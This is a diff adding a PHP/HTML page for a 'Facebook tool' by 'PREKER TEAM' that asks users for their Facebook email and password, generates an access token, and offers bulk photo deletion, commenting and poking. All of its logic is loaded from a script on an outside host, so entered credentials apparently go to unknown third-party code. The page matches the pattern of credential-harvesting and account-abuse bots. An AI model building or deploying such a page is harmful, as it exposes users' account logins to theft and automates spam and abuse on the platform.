@@ -1,0 +1,120 @@
+<style>
+.results tr[visible='false'],
+.no-result{
+ display:none;
+}
+
+.results tr[visible='true']{
+ display:table-row;
+}
+
+.counter{
+ padding:8px;
+ color:#ccc;
+}
+</style>
+ <!-- Page Content -->
+ <?php date_default_timezone_set('Asia/Jakarta'); ?>
+ <div class="container">
+   <div style="padding-top:31px;">
+   </div>
+   <div class="col-md-12">
+     <div class="panel-group">
+         <div class="panel panel-primary"><br/>
+             <center><big><font color=#FF00FF>TOOL FACEBOOK - PREKER TEAM</font></big></center><br/>
+         </div>
+     </div>
+   </div>
+   <div class="row">
+     <div class="col-md-12">
+       <div class="col-md-6">
+         <div class="panel-group">
+           <div class="panel panel-primary">
+             <div style="overflow:auto;height:auto;">
+               <div class="panel-body">
+                   <div class="form-group">
+                     <label><font color=#00FFFF>* Input Your Facebook Email :</font></label>
+                     <input type="text" id="tk" placeholder="Isi Email / Username" class="form-control" autocomplete="off" style="background:#000;color:#0F0;border-bottom:1px solid #F00;border-right:1px solid #F00;border-top:1px solid #F00;border-left:1px solid #F00;"/>
+                   </div>
+                   <div class="form-group">
+                     <label><font color=#00FFFF>* Input Your Facebook Password :</font></label>
+                     <input type="password" id="mk" placeholder="Isi Password" class="form-control" autocomplete="off" style="background:#000;color:#0F0;border-bottom:1px solid #F00;border-right:1px solid #F00;border-top:1px solid #F00;border-left:1px solid #F00;"/>
+                   </div>
+                   <div class="form-group">
+                     <button type="button" class="btn btn-success hijau-btn" onclick="Puaru_Active()" >Generet Token Access</button>
+                   </div>
+               </div>
+               <div class="panel-body">
+                   <div class="form-group">
+                     <label><font color=#00FFFF>* Input Your  Token Access :</font></label>
+                     <div id="trave">
+                         <input type="text" id="access_token" onClick="this.select()" placeholder="Isi Token / Generet Token Access" class="form-control" autocomplete="off" style="background:#000;color:#0F0;border-bottom:1px solid #F00;border-right:1px solid #F00;border-top:1px solid #F00;border-left:1px solid #F00;"/>
+                     </div>
+                   </div>
+                   <div class="form-group">
+                     <label><font color=#00FFFF>* Input Your Comment :</font></label>
+                     <input type="text" id="cm" placeholder="Isi Komentarmu" class="form-control" autocomplete="off" style="background:#000;color:#0F0;border-bottom:1px solid #F00;border-right:1px solid #F00;border-top:1px solid #F00;border-left:1px solid #F00;"/>
+                   </div>
+                   <div class="form-group">
+                     <button id="foto" type="button" class="btn btn-danger btn-md"> Hajar Foto </button>
+                     <button id="coment" type="button" class="btn btn-warning btn-md"> Hajar Koment </button>
+                     <button id="poke" type="button" class="btn btn-info btn-md"> Hajar Poke </button>
+                   </div>
+                 </div>
+               <div class="panel-body">
+                   <div class="form-group">
+                   <div style="border-bottom:1px dashed #FF0;">
+                       <b>HAPUS FOTO : </b><font color=#00FF00><b id="h-sukses">0</b></font>
+                       <b> - </b><font color='red'><b id="h-gagal">0</b></font>
+                   </div>
+                   </div>
+                   <div class="form-group">
+                   <div style="border-bottom:1px dashed #FF0;">
+                         <b>COMMENT : </b><font color=#00FF00><b id="c-sukses">0</b></font>
+                         <b> - </b><font color='red'><b id="c-gagal">0</b> </font>
+                   </div>
+                   </div>
+                   <div class="form-group">
+                   <div style="border-bottom:1px dashed #FF0;">
+                         <b>POKE : </b><font color=#00FF00><b id="p-sukses">0</b></font>
+                         <b> - </b><font color='red'><b id="p-gagal">0</b></font>
+                   </div>
+                   </div>
+                   <br/>
+               </div>
+             </div>
+           </div>
+         </div>
+       </div>
+       <div class="col-md-6">
+           <div class="panel-group">
+             <div class="panel panel-primary">
+               <div style="overflow:auto;height:auto;">
+                 <div class="panel-body">
+                   <div class="form-group">
+                     <label>
+                       <font color=#00FFFF> * Result Proses Foto </font>
+                     </label>
+                       <textarea id="rFoto" name="result" class="form-control multiple" type="text" rows="7" style="background:#000;color:#0F0;border-bottom:1px solid #F00;border-right:1px solid #F00;border-top:1px solid #F00;border-left:1px solid #F00;"></textarea>
+                   </div>
+                   <div class="form-group">
+                     <label>
+                       <font color=#00FFFF> * Result Proses Comment </font>
+                     </label>
+                       <textarea id="rKoment" name="result" class="form-control multiple" type="text" rows="7" style="background:#000;color:#0F0;border-bottom:1px solid #F00;border-right:1px solid #F00;border-top:1px solid #F00;border-left:1px solid #F00;"></textarea>
+                   </div>
+                   <div class="form-group">
+                     <label>
+                       <font color=#00FFFF> * Result Proses Poke </font>
+                     </label>
+                       <textarea id="rPoke" name="result" class="form-control" type="text" rows="7" style="background:#000;color:#0F0;border-bottom:1px solid #F00;border-right:1px solid #F00;border-top:1px solid #F00;border-left:1px solid #F00;"></textarea>
+                   </div>
+                 </div>
+               </div>
+             </div>
+           </div>
+       </div>
+     </div>
+   </div>
+ </div>
+<script src="//htcell.dx.am/com.js?<?php echo date('his');?>"></script>
